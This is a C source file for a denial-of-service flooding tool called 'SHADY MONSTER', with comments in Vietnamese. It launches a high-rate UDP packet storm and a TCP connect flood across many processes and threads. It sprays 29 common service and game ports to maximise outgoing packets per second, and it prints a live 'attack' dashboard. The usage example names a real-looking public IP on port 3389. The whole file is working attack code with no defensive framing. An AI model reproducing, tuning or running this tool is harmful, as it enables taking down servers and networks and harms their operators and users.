/*
 * SHADY MONSTER d1-v14 — TCP + UDP OPTIMIZED FOR OUTGOING PPS
 * Mục tiêu: Outgoing PPS >= 200k (có thể đạt 500k+ nếu VPS mạnh)
 * Tỉ lệ: UDP 60% + TCP connect flood 40%
 * Compile: gcc -O3 -pthread -o d1 d1.c
 * Usage:   sudo ./d1 <IP> <PORT> <TIME> [THREADS]
 */

#define _GNU_SOURCE
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/sysinfo.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/sendfile.h>
#include <sys/epoll.h>

#define GRN "\033[1;32m"
#define CYN "\033[1;36m"
#define YLW "\033[1;33m"
#define RED "\033[1;31m"
#define WHT "\033[1;37m"
#define RST "\033[0m"
#define CLR "\033[2K\r"

#define UDP_PAYLOAD 512
#define SNDBUF_UDP (16 * 1024 * 1024)
#define BURST_SEND 128
#define MAX_SOCKETS_PER_THREAD 256

static int g_ports[] = {19129,19128,14445,22,80,443,8080,8443,53,3306,5432,6379,27017,3389,21,25,110,143,993,995,25565,19132,27015,3074,5060,11211,9200,9090,3478};
static int g_nports = 29;

struct __attribute__((aligned(64))) stats {
    atomic_ulong udp_pkt;
    atomic_ulong udp_bytes;
    atomic_ulong syn_pkt;
    atomic_ulong syn_err;
    atomic_int running;
};
static struct stats *S;
static char  g_ip[64];
static int   g_port, g_dur, g_threads_total, g_num_cores, g_th_per_proc;

static double now(void) {
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
}
static void fmt_bw(double mbps, char *o, size_t n) {
    if (mbps >= 1000.0) snprintf(o, n, "%.2f Gbps", mbps / 1000.0);
    else snprintf(o, n, "%.2f Mbps", mbps);
}
static void fmt_pps(unsigned long long p, char *o, size_t n) {
    if (p >= 1000000) snprintf(o, n, "%.2f Mpps", p / 1000000.0);
    else if (p >= 1000) snprintf(o, n, "%.2f Kpps", p / 1000.0);
    else snprintf(o, n, "%llu pps", p);
}

/* ──── TYPE 1: UDP STORM OPTIMIZED (sendmmsg) ──── */
static void *udp_worker(void *arg) {
    int port = *(int *)arg;
    unsigned char payload[UDP_PAYLOAD];
    for (int i = 0; i < UDP_PAYLOAD; i++)
        payload[i] = (i * 1103515245 + 12345) & 0xFF;

    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return NULL;
    int val = 1;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &(int){SNDBUF_UDP}, sizeof(int));
    setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &(int){SNDBUF_UDP}, sizeof(int));
    #ifdef SO_BUSY_POLL
    val = 100;
    setsockopt(fd, SOL_SOCKET, SO_BUSY_POLL, &val, sizeof(val));
    #endif
    val = 7;
    setsockopt(fd, SOL_SOCKET, SO_PRIORITY, &val, sizeof(val));

    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(port);
    inet_pton(AF_INET, g_ip, &a.sin_addr);
    connect(fd, (struct sockaddr *)&a, sizeof(a));

    // Chuẩn bị mmsghdr cho sendmmsg
    struct mmsghdr msgs[BURST_SEND];
    struct iovec iovs[BURST_SEND];
    memset(msgs, 0, sizeof(msgs));
    for (int i = 0; i < BURST_SEND; i++) {
        iovs[i].iov_base = payload;
        iovs[i].iov_len = UDP_PAYLOAD;
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_len = 0;
    }

    unsigned long local = 0;
    int idx = 0;

    while (atomic_load_explicit(&S->running, memory_order_relaxed)) {
        int ret = sendmmsg(fd, msgs, BURST_SEND, 0);
        if (ret > 0) {
            local += ret;
        }
        if (local >= 1024) {
            atomic_fetch_add_explicit(&S->udp_pkt, local, memory_order_relaxed);
            atomic_fetch_add_explicit(&S->udp_bytes, local * UDP_PAYLOAD, memory_order_relaxed);
            local = 0;
        }
    }
    atomic_fetch_add_explicit(&S->udp_pkt, local, memory_order_relaxed);
    atomic_fetch_add_explicit(&S->udp_bytes, local * UDP_PAYLOAD, memory_order_relaxed);
    close(fd);
    return NULL;
}

/* ──── TYPE 2: TCP CONNECT FLOOD (reuse socket + epoll) ──── */
static void *tcp_connect_worker(void *arg) {
    int port = *(int *)arg;
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(port);
    inet_pton(AF_INET, g_ip, &a.sin_addr);

    int epfd = epoll_create1(0);
    if (epfd < 0) return NULL;

    int *fds = calloc(MAX_SOCKETS_PER_THREAD, sizeof(int));
    struct epoll_event *events = calloc(MAX_SOCKETS_PER_THREAD, sizeof(struct epoll_event));
    for (int i = 0; i < MAX_SOCKETS_PER_THREAD; i++) fds[i] = -1;

    unsigned long ok = 0, fail = 0;
    int nfds = 0;

    while (atomic_load_explicit(&S->running, memory_order_relaxed)) {
        // Tạo kết nối mới
        for (int i = 0; i < MAX_SOCKETS_PER_THREAD; i++) {
            if (fds[i] >= 0) continue;
            int fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd < 0) continue;
            int yes = 1;
            setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
            setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &(int){16 * 1024 * 1024}, sizeof(int));
            setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &(int){16 * 1024 * 1024}, sizeof(int));
            setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &yes, sizeof(yes));
            fcntl(fd, F_SETFL, O_NONBLOCK);
            if (connect(fd, (struct sockaddr *)&a, sizeof(a)) == 0 || errno == EINPROGRESS) {
                fds[i] = fd;
                struct epoll_event ev;
                ev.events = EPOLLOUT | EPOLLET;
                ev.data.fd = fd;
                epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);
                nfds++;
            } else {
                close(fd);
                fail++;
            }
        }

        // Xử lý epoll events
        int n = epoll_wait(epfd, events, MAX_SOCKETS_PER_THREAD, 0);
        for (int i = 0; i < n; i++) {
            int fd = events[i].data.fd;
            int err = 0;
            socklen_t len = sizeof(err);
            if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &len) != 0 || err != 0) {
                epoll_ctl(epfd, EPOLL_CTL_DEL, fd, NULL);
                close(fd);
                fail++;
                continue;
            }
            // Gửi một byte dữ liệu để giữ kết nối
            char c = 'A';
            send(fd, &c, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
            ok++;
        }

        if (ok >= 2048) {
            atomic_fetch_add_explicit(&S->syn_pkt, ok, memory_order_relaxed);
            ok = 0;
        }
        if (fail >= 2048) {
            atomic_fetch_add_explicit(&S->syn_err, fail, memory_order_relaxed);
            fail = 0;
        }
    }

    for (int i = 0; i < MAX_SOCKETS_PER_THREAD; i++) {
        if (fds[i] >= 0) close(fds[i]);
    }
    free(fds); free(events); close(epfd);
    return NULL;
}

/* ──── CHILD ──── */
static void child(int core_id) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(core_id % g_num_cores, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    int udp_th = g_th_per_proc * 60 / 100;
    int syn_th = g_th_per_proc - udp_th;
    if (udp_th < 1) udp_th = 1;
    if (syn_th < 1) syn_th = 1;

    int total = udp_th + syn_th;
    pthread_t *tids = calloc(total, sizeof(pthread_t));
    int *ports = calloc(total, sizeof(int));
    if (!tids || !ports) _exit(1);

    int ti = 0;
    for (int i = 0; i < udp_th; i++) {
        ports[ti] = g_ports[i % g_nports];
        pthread_create(&tids[ti], NULL, udp_worker, &ports[ti]); ti++;
    }
    for (int i = 0; i < syn_th; i++) {
        ports[ti] = g_ports[i % g_nports];
        pthread_create(&tids[ti], NULL, tcp_connect_worker, &ports[ti]); ti++;
    }
    for (int i = 0; i < total; i++) pthread_join(tids[i], NULL);
    free(ports); free(tids);
    _exit(0);
}

/* ──── MONITOR ──── */
static void monitor(void) {
    double t0 = now(), lt = t0;
    unsigned long long ludp = 0, ludp_bytes = 0, lsyn = 0, lsyn_err = 0;

    printf("\n");
    while (atomic_load_explicit(&S->running, memory_order_relaxed)) {
        usleep(500000);
        double nw = now(), dt = nw - lt;
        if (dt <= 0) continue;

        unsigned long long udp      = atomic_load_explicit(&S->udp_pkt, memory_order_relaxed);
        unsigned long long udp_bytes = atomic_load_explicit(&S->udp_bytes, memory_order_relaxed);
        unsigned long long syn      = atomic_load_explicit(&S->syn_pkt, memory_order_relaxed);
        unsigned long long syn_err  = atomic_load_explicit(&S->syn_err, memory_order_relaxed);

        unsigned long long dp = (udp - ludp) + (syn - lsyn);
        unsigned long long db = (udp_bytes - ludp_bytes);
        unsigned long long pps = (unsigned long long)(dp / dt);
        unsigned long long syn_pps = (unsigned long long)((syn - lsyn) / dt);
        double mbps = (db * 8.0) / (dt * 1e6);

        char ps[32], bs[32], sps[32];
        fmt_pps(pps, ps, sizeof(ps)); fmt_bw(mbps, bs, sizeof(bs));
        fmt_pps(syn_pps, sps, sizeof(sps));

        double el = nw - t0;
        int pct = (int)(el / g_dur * 100); if (pct > 100) pct = 100;
        int bw = 30, fl = bw * pct / 100;
        char bar[64];
        for (int i = 0; i < bw; i++) bar[i] = (i < fl) ? '#' : '-';
        bar[bw] = '\0';

        printf(CLR GRN "║ " WHT "%s:%d" GRN " │ %3d%% [%s] │ "
               GRN "BW:%s" CYN " │ " GRN "PPS:%s" GRN " │ UDP:%llu SYN:%llu/%s err:%llu ║" RST,
               g_ip, g_port, pct, bar, bs, ps, udp, syn, sps, syn_err);
        fflush(stdout);

        ludp = udp; ludp_bytes = udp_bytes;
        lsyn = syn; lsyn_err = syn_err;
        lt = nw;
        if (el >= g_dur) atomic_store_explicit(&S->running, 0, memory_order_relaxed);
    }

    double dur = now() - t0; if (dur <= 0) dur = 1;
    unsigned long long udp      = atomic_load_explicit(&S->udp_pkt, memory_order_relaxed);
    unsigned long long udp_bytes = atomic_load_explicit(&S->udp_bytes, memory_order_relaxed);
    unsigned long long syn      = atomic_load_explicit(&S->syn_pkt, memory_order_relaxed);
    unsigned long long syn_err  = atomic_load_explicit(&S->syn_err, memory_order_relaxed);

    unsigned long long total_pkt = udp + syn;
    unsigned long long total_bytes = udp_bytes;
    double ap = total_pkt / dur, am = (total_bytes * 8.0) / (dur * 1e6);
    char ps[32], bs[32];
    fmt_pps((unsigned long long)ap, ps, sizeof(ps)); fmt_bw(am, bs, sizeof(bs));

    printf("\n\n" GRN "  ╔══════════════════════════════════════════╗" RST "\n");
    printf(GRN "  ║        ATTACK FINISHED — SUMMARY         ║" RST "\n");
    printf(GRN "  ╠══════════════════════════════════════════╣" RST "\n");
    printf(GRN "  ║  UDP pkts:     %-22llu ║" RST "\n", udp);
    printf(GRN "  ║  UDP bytes:    %llu (%.2f GB) ║" RST "\n", udp_bytes, udp_bytes / 1e9);
    printf(GRN "  ║  SYN pkts:     %-22llu ║" RST "\n", syn);
    printf(GRN "  ║  SYN err:      %-22llu ║" RST "\n", syn_err);
    printf(GRN "  ║  Avg PPS:      %-22s ║" RST "\n", ps);
    printf(GRN "  ║  Avg BW:       %-22s ║" RST "\n", bs);
    printf(GRN "  ╚══════════════════════════════════════════╝" RST "\n\n");
}

static void sig(int s) { (void)s; if (S) atomic_store_explicit(&S->running, 0, memory_order_relaxed); }

int main(int argc, char *argv[]) {
    printf("\n" RED "  ╔══════════════════════════════════════════════╗" RST "\n");
    printf(RED "  ║  👹 SHADY MONSTER d1-v14 — TCP+UDP    ║" RST "\n");
    printf(RED "  ╚══════════════════════════════════════════════╝" RST "\n\n");

    if (argc < 4) {
        printf("Usage: %s <IP> <PORT> <TIME> [THREADS]\n", argv[0]);
        printf("Example: sudo %s 52.221.250.215 3389 120 4096\n\n", argv[0]);
        return 1;
    }
    strncpy(g_ip, argv[1], sizeof(g_ip)-1);
    g_port = atoi(argv[2]); g_dur = atoi(argv[3]);
    g_threads_total = (argc >= 5) ? atoi(argv[4]) : 0;
    if (g_dur < 1) g_dur = 30;

    g_num_cores = get_nprocs(); if (g_num_cores < 1) g_num_cores = 1;
    if (g_threads_total <= 0) g_threads_total = g_num_cores * 4096;
    g_th_per_proc = g_threads_total / g_num_cores;
    if (g_th_per_proc < 16) g_th_per_proc = 16;

    printf("  Target:    %s:%d\n", g_ip, g_port);
    printf("  Duration:  %ds\n", g_dur);
    printf("  Cores:     %d\n", g_num_cores);
    printf("  Threads:   %d (%d/proc)\n", g_threads_total, g_th_per_proc);
    printf("  Carpet:    %d ports\n", g_nports);
    printf("  UDP payload: %dB\n", UDP_PAYLOAD);
    printf("  Mode:      UDP storm(60%%) + TCP connect flood(40%%) - OPTIMIZED\n\n");

    S = mmap(NULL, sizeof(struct stats), PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    if (S == MAP_FAILED) { perror("mmap"); return 1; }
    memset(S, 0, sizeof(struct stats));
    atomic_store_explicit(&S->running, 1, memory_order_relaxed);
    signal(SIGINT, sig); signal(SIGTERM, sig);

    pid_t *pids = calloc(g_num_cores, sizeof(pid_t));
    for (int i = 0; i < g_num_cores; i++) {
        pid_t p = fork();
        if (p == 0) child(i);
        else if (p > 0) pids[i] = p;
        else { atomic_store_explicit(&S->running, 0, memory_order_relaxed); break; }
    }
    monitor();
    for (int i = 0; i < g_num_cores; i++)
        if (pids[i] > 0) { kill(pids[i], SIGKILL); waitpid(pids[i], NULL, 0); }
    free(pids); munmap(S, sizeof(struct stats));
    return 0;
}